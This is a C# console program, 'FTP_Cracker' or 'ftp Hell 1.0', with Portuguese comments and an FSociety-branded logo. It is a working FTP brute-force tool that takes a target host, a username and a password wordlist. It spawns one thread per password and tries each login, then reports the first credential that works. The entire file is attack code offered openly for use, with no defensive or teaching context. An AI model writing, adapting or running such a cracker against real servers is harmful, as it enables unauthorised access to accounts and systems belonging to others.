using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;
using System.Threading;
namespace FTP_Cracker
{
    class Program
    {
        static string Logo = @"
   __ _           _    _      _ _   __   ___  
  / _| |         | |  | |    | | | /_ | / _ \ 
 | |_| |_ _ __   | |__| | ___| | |  | || | | |
 |  _| __| '_ \  |  __  |/ _ \ | |  | || | | |
 | | | |_| |_) | | |  | |  __/ | |  | || |_| |
 |_|  \__| .__/  |_|  |_|\___|_|_|  |_(_)___/ 
         | |                                  
         |_|                             
                        @gusdnide
                        @Microsoft
                        @FSociety
";
     static   bool Testando = false;
       static string senha = "";
     static   void Logar(string Host, string Usuario, string Senha)
        {
            if (Testando == true)
            {
                FtpWebRequest request = (FtpWebRequest)FtpWebRequest.Create("ftp://" + Host + "/");
                request.Credentials = new NetworkCredential(Usuario, Senha);
                try
                {
                    request.Method = WebRequestMethods.Ftp.ListDirectory;
                    request.Credentials = new NetworkCredential(Usuario, Senha);
                    request.GetResponse();
                    Console.Clear();
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("[ * ] Login: " + Usuario + " Senha: " + Senha + " Está correto!");
                    Console.ForegroundColor = ConsoleColor.DarkCyan;
                    Environment.Exit(0);
                }
                catch (Exception ex)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[ * ] Login: " + Usuario + " Senha: " + Senha + " Está incorreto!");
                    Console.ForegroundColor = ConsoleColor.DarkCyan;
                    return;
                }
                senha = Senha;
                Console.ForegroundColor = ConsoleColor.DarkCyan;
            }
        }
       static void TentarLogin(string host , string login, string Arquivo)
        {
            try
            {
                string[] Senhas = File.ReadAllLines(Arquivo);
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine("" + Senhas.Count() + " Senhas Carregadas!");
                Testando = true;
                for (int i = 0; i < Senhas.Count(); i++)
                {
                    if (Testando == true)
                    {
                        CriarThreadLogin(host, login, Senhas[i]);
                    }
                    else { break; }
                }
               
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Error ao carregar senhas!");
                Console.ForegroundColor = ConsoleColor.DarkCyan;
            }

        }
        static void CriarThreadLogin(string Host, string Usuario, string Senha)
        {
            Thread t = new Thread(() => Logar(Host, Usuario, Senha));
            t.Start();
        }
        static void CriarThreadWord(string Arquivo, string Host, string Usuario)
        {
            Thread t = new Thread(() => TentarLogin(Host, Usuario, Arquivo));
            t.Start();
        }
        static void Escrever(string str, ConsoleColor cor = ConsoleColor.White)
        {
            int Count = str.Count();
            ConsoleColor cBackup = Console.ForegroundColor;
            Console.ForegroundColor = cor;
            for (int i = 0; i < Count; i++)
            {
                Console.Write(str[i]);
                Thread.Sleep(1);
            }
            Console.WriteLine("");
            Console.ForegroundColor = cBackup;
        }
        static void Main(string[] args)
        {
            Escrever(Logo, ConsoleColor.Green);
            try
            {
                string Alvo = args[0];
                Console.WriteLine("Alvo: "+Alvo);
                string Usuario = args[1];
                Console.WriteLine("Usuario: " +Usuario);
                string ArquivoSenha = args[2];
                if (ArquivoSenha == "" || Alvo == "" || Usuario == "")
                {
                    Console.WriteLine("Esta faltando argumentos!");
                    Console.WriteLine("ftphell.exe <alvo> <usuario> <WordList>");
                    Console.WriteLine("Exemplo :  ftphell.exe 192.168.1.1 admin word.txt");
                }
                if (!File.Exists(ArquivoSenha))
                {

                    Escrever("Arquivo nao encontrado");
                }
                else
                {

                    CriarThreadWord(ArquivoSenha, Alvo, Usuario);
                }


                
            }catch(Exception ex){
                Escrever("Aconteceu algo");
                Escrever("ftphell.exe <alvo> <usuario> <WordList>");
                Escrever("Exemplo :  ftphell.exe 192.168.1.1 admin word.txt");
            }
            Console.ForegroundColor = ConsoleColor.DarkCyan;
        }
    }
}
